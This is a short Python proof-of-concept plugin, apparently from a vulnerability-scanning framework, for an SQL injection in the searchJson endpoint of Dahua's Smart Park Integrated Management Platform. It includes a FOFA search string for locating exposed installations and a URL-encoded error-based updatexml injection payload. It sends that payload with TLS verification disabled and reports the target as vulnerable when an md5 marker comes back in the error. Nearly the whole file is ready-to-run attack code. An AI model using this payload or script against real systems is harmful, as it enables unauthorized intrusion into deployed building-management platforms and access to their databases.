#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/pBF4tKQqdUTCXCJIlvSDag',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '大华智慧园区综合管理平台 searchJson SQL注入',

      'level'     :   'high',

      'FOFA'      :   'app="dahua-智慧园区综合管理平台"',
      
      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomInt(n,m):#返回某个范围中的int
  import random
  return random.randint(n,m)
def hashmd5(s):
  import hashlib
  md5 = hashlib.md5()
  md5.update(str(s).encode('utf-8'))
  str_md5 = md5.hexdigest()
  return str_md5[0:15]
def run(url,ua):
  r0 = randomInt(10000,20000)
  r1 = hashmd5(r0)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = f'/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5({r0})),0x7e),1)--%22%7D/extend/%7B%7D'
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 500 and re.search(r'XPATH syntax error',res.text,re.S) and r1 in res.text:
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret